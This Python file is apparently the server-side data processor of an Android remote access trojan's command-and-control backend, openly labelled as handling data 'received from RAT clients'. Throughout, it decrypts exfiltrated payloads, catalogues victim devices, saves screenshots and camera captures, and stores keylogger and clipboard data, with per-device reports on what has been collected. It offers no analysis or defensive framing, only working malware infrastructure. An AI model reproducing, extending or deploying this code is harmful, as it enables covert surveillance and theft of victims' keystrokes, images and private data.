#!/usr/bin/env python3
import os
import json
import base64
import time
import logging
import sqlite3
import threading
import zipfile
import io
from typing import Dict, List, Any, Optional, Union
from concurrent.futures import ThreadPoolExecutor
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("data_processor.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("data_processor")

class DataProcessor:
    """Process and store data received from RAT clients"""
    
    DB_FILE = "c2_data.db"
    DATA_DIR = "device_data"
    
    def __init__(self):
        # Load encryption key from environment or use default
        self.key = os.getenv("ENCRYPTION_KEY", "tarjon_default_encryption_key_do_not_change!").encode()
        self.key = self.derive_key(self.key)
        
        # Initialize database and data directory
        self._init_database()
        self._ensure_data_dir()
        
        # Thread pool for asynchronous processing
        self.executor = ThreadPoolExecutor(max_workers=5)
        
        # Lock for thread safety
        self.db_lock = threading.Lock()
        
        logger.info("DataProcessor initialized")
    
    def _init_database(self):
        """Initialize SQLite database for storing device data metadata"""
        with sqlite3.connect(self.DB_FILE) as conn:
            cursor = conn.cursor()
            
            # Table for device information
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS device_info (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                manufacturer TEXT,
                model TEXT,
                android_version TEXT,
                first_seen INTEGER NOT NULL,
                last_seen INTEGER NOT NULL,
                data_types TEXT
            )
            ''')
            
            # Table for keeping track of data files
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS data_files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT NOT NULL,
                file_path TEXT NOT NULL,
                data_type TEXT NOT NULL,
                timestamp INTEGER NOT NULL,
                file_size INTEGER NOT NULL
            )
            ''')
            
            # Create indexes for faster lookups
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_device_id ON device_info (device_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_device_data ON data_files (device_id, data_type)')
            
            conn.commit()
    
    def _ensure_data_dir(self):
        """Ensure data directory exists"""
        if not os.path.exists(self.DATA_DIR):
            os.makedirs(self.DATA_DIR)
    
    def derive_key(self, key_material: bytes) -> bytes:
        """Derive a fixed-length key from the provided key material"""
        # Use SHA-256 to get a consistent key length of exactly 32 bytes
        import hashlib
        return hashlib.sha256(key_material).digest()
    
    def decrypt_data(self, encrypted_data: str) -> str:
        """Decrypt data received from devices"""
        try:
            # Decode from base64
            binary_data = base64.b64decode(encrypted_data)
            
            # Extract IV (first 16 bytes for AES)
            iv = binary_data[:16]
            ciphertext = binary_data[16:]
            
            # Create AES cipher
            cipher = Cipher(
                algorithms.AES(self.key),
                modes.CBC(iv),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            
            # Decrypt the data
            padded_data = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Unpad the result
            unpadder = padding.PKCS7(128).unpadder()
            data = unpadder.update(padded_data) + unpadder.finalize()
            
            return data.decode('utf-8')
        
        except Exception as e:
            logger.error(f"Error decrypting data: {str(e)}", exc_info=True)
            raise
    
    def process_async(self, device_id: str, encrypted_data: str, data_type: str):
        """Process data asynchronously in a separate thread"""
        self.executor.submit(self._process_data, device_id, encrypted_data, data_type)
    
    def _process_data(self, device_id: str, encrypted_data: str, data_type: str):
        """Process and store data from a device"""
        try:
            # Create device-specific directory if it doesn't exist
            device_dir = os.path.join(self.DATA_DIR, device_id)
            if not os.path.exists(device_dir):
                os.makedirs(device_dir)
            
            # Decrypt the data
            decrypted_data = self.decrypt_data(encrypted_data)
            
            # Process based on data type
            if data_type == "device_info":
                self._process_device_info(device_id, decrypted_data)
            else:
                self._store_general_data(device_id, decrypted_data, data_type)
            
            logger.info(f"Processed {data_type} data from device {device_id}")
        
        except Exception as e:
            logger.error(f"Error processing {data_type} data for device {device_id}: {str(e)}", exc_info=True)
    
    def _process_device_info(self, device_id: str, data_json: str):
        """Process and store device information"""
        try:
            data = json.loads(data_json)
            
            # Extract device details
            manufacturer = data.get('manufacturer', 'Unknown')
            model = data.get('model', 'Unknown')
            android_version = data.get('android_version', 'Unknown')
            
            current_time = int(time.time())
            
            # Store device info in database
            with self.db_lock:
                with sqlite3.connect(self.DB_FILE) as conn:
                    cursor = conn.cursor()
                    
                    # Check if device already exists
                    cursor.execute('SELECT id FROM device_info WHERE device_id = ?', (device_id,))
                    device_exists = cursor.fetchone()
                    
                    if device_exists:
                        # Update existing device
                        cursor.execute('''
                        UPDATE device_info 
                        SET manufacturer = ?, model = ?, android_version = ?, last_seen = ?
                        WHERE device_id = ?
                        ''', (manufacturer, model, android_version, current_time, device_id))
                    else:
                        # Insert new device
                        cursor.execute('''
                        INSERT INTO device_info 
                        (device_id, manufacturer, model, android_version, first_seen, last_seen, data_types)
                        VALUES (?, ?, ?, ?, ?, ?, ?)
                        ''', (device_id, manufacturer, model, android_version, current_time, current_time, 'device_info'))
                    
                    conn.commit()
            
            # Also save the raw data as a JSON file
            file_path = os.path.join(self.DATA_DIR, device_id, f"device_info_{current_time}.json")
            with open(file_path, 'w') as f:
                f.write(data_json)
            
            # Update data files table
            self._record_data_file(device_id, file_path, "device_info", current_time, len(data_json))
            
            logger.info(f"Processed device info for {device_id}: {manufacturer} {model}, Android {android_version}")
        
        except json.JSONDecodeError:
            logger.error(f"Invalid JSON in device_info for device {device_id}")
        except Exception as e:
            logger.error(f"Error processing device info: {str(e)}", exc_info=True)
    
    def _store_general_data(self, device_id: str, data_json: str, data_type: str):
        """Store general data from device"""
        try:
            # Store as a JSON file
            current_time = int(time.time())
            file_path = os.path.join(self.DATA_DIR, device_id, f"{data_type}_{current_time}.json")
            
            with open(file_path, 'w') as f:
                f.write(data_json)
            
            # Update data files table
            self._record_data_file(device_id, file_path, data_type, current_time, len(data_json))
            
            # Update device info with new data type
            self._update_device_data_types(device_id, data_type)
            
            logger.info(f"Stored {data_type} data for device {device_id}")
            
            # Process any special data types
            if data_type in ["screenshot", "camera"]:
                self._process_media_data(device_id, data_json, data_type)
            elif data_type in ["keylog", "clipboard"]:
                self._process_sensitive_data(device_id, data_json, data_type)
            
        except Exception as e:
            logger.error(f"Error storing {data_type} data: {str(e)}", exc_info=True)
    
    def _record_data_file(self, device_id: str, file_path: str, data_type: str, timestamp: int, file_size: int):
        """Record a data file in the database"""
        try:
            with self.db_lock:
                with sqlite3.connect(self.DB_FILE) as conn:
                    cursor = conn.cursor()
                    
                    cursor.execute('''
                    INSERT INTO data_files (device_id, file_path, data_type, timestamp, file_size)
                    VALUES (?, ?, ?, ?, ?)
                    ''', (device_id, file_path, data_type, timestamp, file_size))
                    
                    conn.commit()
        except Exception as e:
            logger.error(f"Error recording data file: {str(e)}", exc_info=True)
    
    def _update_device_data_types(self, device_id: str, data_type: str):
        """Update the list of data types available for a device"""
        try:
            with self.db_lock:
                with sqlite3.connect(self.DB_FILE) as conn:
                    cursor = conn.cursor()
                    
                    # Get current data types
                    cursor.execute('SELECT data_types FROM device_info WHERE device_id = ?', (device_id,))
                    result = cursor.fetchone()
                    
                    if result:
                        data_types = result[0]
                        
                        # Add new data type if not already present
                        if data_types:
                            data_types_list = data_types.split(',')
                            if data_type not in data_types_list:
                                data_types_list.append(data_type)
                                new_data_types = ','.join(data_types_list)
                            else:
                                new_data_types = data_types
                        else:
                            new_data_types = data_type
                        
                        # Update data types
                        cursor.execute('''
                        UPDATE device_info 
                        SET data_types = ?, last_seen = ?
                        WHERE device_id = ?
                        ''', (new_data_types, int(time.time()), device_id))
                        
                        conn.commit()
        except Exception as e:
            logger.error(f"Error updating device data types: {str(e)}", exc_info=True)
    
    def _process_media_data(self, device_id: str, data_json: str, data_type: str):
        """Process and store media data (screenshots, camera images)"""
        try:
            data = json.loads(data_json)
            
            # If data contains base64 image, save it as a file
            if 'data' in data and 'format' in data:
                image_data = data.get('data')
                image_format = data.get('format', 'jpg')
                
                if image_data:
                    # Decode base64 image data
                    try:
                        binary_data = base64.b64decode(image_data)
                        
                        # Create media directory if it doesn't exist
                        media_dir = os.path.join(self.DATA_DIR, device_id, data_type)
                        if not os.path.exists(media_dir):
                            os.makedirs(media_dir)
                        
                        # Save to file
                        current_time = int(time.time())
                        file_path = os.path.join(media_dir, f"{data_type}_{current_time}.{image_format}")
                        
                        with open(file_path, 'wb') as f:
                            f.write(binary_data)
                        
                        # Update data files table
                        self._record_data_file(device_id, file_path, f"{data_type}_image", current_time, len(binary_data))
                        
                        logger.info(f"Saved {data_type} image for device {device_id}")
                    
                    except Exception as e:
                        logger.error(f"Error saving {data_type} image: {str(e)}", exc_info=True)
        
        except json.JSONDecodeError:
            logger.error(f"Invalid JSON in {data_type} data for device {device_id}")
        except Exception as e:
            logger.error(f"Error processing {data_type} data: {str(e)}", exc_info=True)
    
    def _process_sensitive_data(self, device_id: str, data_json: str, data_type: str):
        """Process sensitive data like keylogger and clipboard data"""
        try:
            # For sensitive data, we ensure secure storage with encryption at rest
            current_time = int(time.time())
            
            # Create specialized directory if it doesn't exist
            sensitive_dir = os.path.join(self.DATA_DIR, device_id, "sensitive")
            if not os.path.exists(sensitive_dir):
                os.makedirs(sensitive_dir)
            
            # Store original data with additional layer of encryption
            file_path = os.path.join(sensitive_dir, f"{data_type}_{current_time}.enc")
            
            # Encrypt the data again for storage (double encryption)
            iv = os.urandom(16)
            cipher = Cipher(
                algorithms.AES(self.key),
                modes.CBC(iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            
            # Pad the data
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data_json.encode()) + padder.finalize()
            
            # Encrypt
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            # Prepend IV and write to file
            with open(file_path, 'wb') as f:
                f.write(iv + ciphertext)
            
            # Update data files table
            self._record_data_file(device_id, file_path, f"{data_type}_encrypted", current_time, len(iv + ciphertext))
            
            logger.info(f"Securely stored sensitive {data_type} data for device {device_id}")
        
        except Exception as e:
            logger.error(f"Error processing sensitive {data_type} data: {str(e)}", exc_info=True)
    
    def extract_from_compressed(self, data_json: str) -> Dict[str, Any]:
        """Extract data from compressed formats if needed"""
        try:
            data = json.loads(data_json)
            
            # Check if data is in a compressed format
            if 'compressed' in data and data['compressed'] and 'data' in data:
                compressed_data = base64.b64decode(data['data'])
                
                # Try to decompress using zipfile
                try:
                    with zipfile.ZipFile(io.BytesIO(compressed_data)) as zip_file:
                        # Extract the first file (assuming it's a JSON file)
                        for filename in zip_file.namelist():
                            if filename.endswith('.json'):
                                with zip_file.open(filename) as f:
                                    return json.loads(f.read().decode('utf-8'))
                except Exception as e:
                    logger.error(f"Error decompressing data: {str(e)}", exc_info=True)
            
            # If not compressed or decompression failed, return the original data
            return data
        
        except json.JSONDecodeError:
            logger.error("Invalid JSON in compressed data")
            return {}
        except Exception as e:
            logger.error(f"Error extracting from compressed data: {str(e)}", exc_info=True)
            return {}
    
    def get_device_data(self, device_id: str, data_type: str = None) -> Dict[str, Any]:
        """Get all data for a specific device, optionally filtered by type"""
        try:
            result = {"device_id": device_id, "data": {}}
            
            with self.db_lock:
                with sqlite3.connect(self.DB_FILE) as conn:
                    conn.row_factory = sqlite3.Row
                    cursor = conn.cursor()
                    
                    # Get device info
                    cursor.execute('SELECT * FROM device_info WHERE device_id = ?', (device_id,))
                    device_info = cursor.fetchone()
                    
                    if not device_info:
                        return None  # Device not found
                    
                    # Convert to dict
                    result["info"] = dict(device_info)
                    
                    # Get data files
                    if data_type:
                        cursor.execute('''
                        SELECT * FROM data_files 
                        WHERE device_id = ? AND data_type = ?
                        ORDER BY timestamp DESC
                        ''', (device_id, data_type))
                    else:
                        cursor.execute('''
                        SELECT * FROM data_files 
                        WHERE device_id = ?
                        ORDER BY timestamp DESC, data_type
                        ''', (device_id,))
                    
                    data_files = cursor.fetchall()
                    
                    # Group by data type
                    data_by_type = {}
                    for file_info in data_files:
                        data_type = file_info['data_type']
                        
                        if data_type not in data_by_type:
                            data_by_type[data_type] = []
                        
                        data_by_type[data_type].append(dict(file_info))
                    
                    result["data"] = data_by_type
            
            return result
        
        except Exception as e:
            logger.error(f"Error getting device data: {str(e)}", exc_info=True)
            return None
    
    def get_file_content(self, file_path: str, decrypt: bool = False) -> Optional[str]:
        """Get content of a data file, optionally decrypting if necessary"""
        try:
            if not os.path.exists(file_path):
                return None
            
            if decrypt and file_path.endswith('.enc'):
                # Read and decrypt file
                with open(file_path, 'rb') as f:
                    data = f.read()
                
                # Extract IV (first 16 bytes)
                iv = data[:16]
                ciphertext = data[16:]
                
                # Create AES cipher
                cipher = Cipher(
                    algorithms.AES(self.key),
                    modes.CBC(iv),
                    backend=default_backend()
                )
                decryptor = cipher.decryptor()
                
                # Decrypt the data
                padded_data = decryptor.update(ciphertext) + decryptor.finalize()
                
                # Unpad the result
                unpadder = padding.PKCS7(128).unpadder()
                decrypted_data = unpadder.update(padded_data) + unpadder.finalize()
                
                return decrypted_data.decode('utf-8')
            else:
                # Regular file, just read
                with open(file_path, 'r') as f:
                    return f.read()
        
        except Exception as e:
            logger.error(f"Error reading file {file_path}: {str(e)}", exc_info=True)
            return None
    
    def get_all_devices(self) -> List[Dict[str, Any]]:
        """Get a list of all devices in the database"""
        devices = []
        
        try:
            with self.db_lock:
                with sqlite3.connect(self.DB_FILE) as conn:
                    conn.row_factory = sqlite3.Row
                    cursor = conn.cursor()
                    
                    cursor.execute('SELECT * FROM device_info ORDER BY last_seen DESC')
                    
                    for row in cursor.fetchall():
                        devices.append(dict(row))
            
            return devices
        
        except Exception as e:
            logger.error(f"Error getting devices: {str(e)}", exc_info=True)
            return []
    
    def clear_old_data(self, days: int = 90) -> int:
        """Clear old data files to free up space"""
        try:
            # Calculate cutoff timestamp
            cutoff_time = int(time.time()) - (days * 24 * 60 * 60)
            
            file_paths_to_delete = []
            
            with self.db_lock:
                with sqlite3.connect(self.DB_FILE) as conn:
                    cursor = conn.cursor()
                    
                    # Get files older than cutoff
                    cursor.execute('''
                    SELECT id, file_path FROM data_files
                    WHERE timestamp < ?
                    ''', (cutoff_time,))
                    
                    old_files = cursor.fetchall()
                    
                    for file_id, file_path in old_files:
                        file_paths_to_delete.append((file_id, file_path))
                    
                    # Delete records from database
                    cursor.execute('DELETE FROM data_files WHERE timestamp < ?', (cutoff_time,))
                    conn.commit()
            
            # Delete actual files
            deleted_count = 0
            for file_id, file_path in file_paths_to_delete:
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                        deleted_count += 1
                except Exception as e:
                    logger.error(f"Error deleting file {file_path}: {str(e)}")
            
            logger.info(f"Cleared {deleted_count} old data files")
            return deleted_count
        
        except Exception as e:
            logger.error(f"Error clearing old data: {str(e)}", exc_info=True)
            return 0

    def generate_data_report(self, device_id: str) -> Dict[str, Any]:
        """Generate a summary report of all data collected from a device"""
        try:
            report = {
                "device_id": device_id,
                "generated_at": int(time.time()),
                "summary": {},
                "data_types": {}
            }
            
            with self.db_lock:
                with sqlite3.connect(self.DB_FILE) as conn:
                    conn.row_factory = sqlite3.Row
                    cursor = conn.cursor()
                    
                    # Get device info
                    cursor.execute('SELECT * FROM device_info WHERE device_id = ?', (device_id,))
                    device_info = cursor.fetchone()
                    
                    if not device_info:
                        return {"error": "Device not found"}
                    
                    report["device_info"] = dict(device_info)
                    
                    # Get summary of data types
                    cursor.execute('''
                    SELECT data_type, COUNT(*) as count, MIN(timestamp) as first, MAX(timestamp) as last
                    FROM data_files
                    WHERE device_id = ?
                    GROUP BY data_type
                    ''', (device_id,))
                    
                    for row in cursor.fetchall():
                        data_type = row['data_type']
                        report["data_types"][data_type] = {
                            "count": row['count'],
                            "first_collected": row['first'],
                            "last_collected": row['last']
                        }
                    
                    # Calculate total data size
                    cursor.execute('''
                    SELECT SUM(file_size) as total_size
                    FROM data_files
                    WHERE device_id = ?
                    ''', (device_id,))
                    
                    total_size = cursor.fetchone()['total_size'] or 0
                    report["summary"]["total_data_size"] = total_size
                    report["summary"]["data_types_count"] = len(report["data_types"])
                    
                    # Get recent activity
                    cursor.execute('''
                    SELECT data_type, timestamp
                    FROM data_files
                    WHERE device_id = ?
                    ORDER BY timestamp DESC
                    LIMIT 10
                    ''', (device_id,))
                    
                    recent_activity = []
                    for row in cursor.fetchall():
                        recent_activity.append({
                            "data_type": row['data_type'],
                            "timestamp": row['timestamp']
                        })
                    
                    report["summary"]["recent_activity"] = recent_activity
            
            return report
        
        except Exception as e:
            logger.error(f"Error generating data report: {str(e)}", exc_info=True)
            return {"error": str(e)}
